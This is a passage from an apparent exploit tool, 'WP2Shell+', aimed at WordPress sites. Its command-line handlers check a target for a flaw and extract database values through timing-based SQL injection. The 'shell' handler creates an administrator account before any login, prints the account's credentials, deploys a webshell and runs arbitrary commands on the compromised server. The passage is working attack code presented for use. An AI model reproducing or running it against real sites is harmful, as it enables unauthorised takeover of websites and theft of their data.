        print(f"[+] {expr}: {sqli_b.extract(expr)}")
    return 0

def cmd_shell(a):
    print("[*] Creating admin pre-auth...")
    creator = PreAuthAdminCreator(a.url, sleep=a.sleep)
    try:
        admin = creator.create_admin()
    except Exception as e:
        print(f"[-] Admin creation failed: {e}"); return 1
    print(f"[+] Admin: {admin.username} / {admin.password}")
    # Skip login if captcha or login fails — just print credentials
    print("[*] Logging in...")
    session = AdminSession(a.url)
    try:
        logged_in = session.login(admin.username, admin.password)
    except Exception as e:
        print(f"[!] Login error: {e}")
        logged_in = False
    if not logged_in:
        print(f"[!] Login failed (maybe captcha) — admin created, use manual login:")
        print(f"    URL:  {a.url}/wp-login.php")
        print(f"    user: {admin.username}")
        print(f"    pass: {admin.password}")
        return 0
    print("[+] Authenticated")
    print("[*] Deploying webshell...")
    try:
        path = session.deploy_webshell()
        print(f"[+] Webshell: {a.url.rstrip('/')}{path}")
    except Exception as e:
        print(f"[!] Webshell deploy failed: {e}")
        return 0
    if a.cmd:
        try:
            out = session.run(path, a.cmd)
            if out:
                print(f"\n{out.rstrip()}")
            else:
                print("[-] No output")
        except Exception as e:
            print(f"[!] Command failed: {e}")
    return 0

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="WP2Shell+ — enhanced 0xsha with timing+widgets fallback")
    sub = ap.add_subparsers(dest="command", required=True)
    c = sub.add_parser("check"); c.add_argument("url"); c.add_argument("--sleep",type=float,default=3.0); c.set_defaults(func=cmd_check)
    r = sub.add_parser("read"); r.add_argument("url"); r.add_argument("query",nargs="?"); r.add_argument("--sleep",type=float,default=5.0); r.set_defaults(func=cmd_read)
    s = sub.add_parser("shell"); s.add_argument("url"); s.add_argument("-c","--cmd"); s.add_argument("--sleep",type=float,default=5.0); s.set_defaults(func=cmd_shell)
    a = ap.parse_args()
    sys.exit(a.func(a))
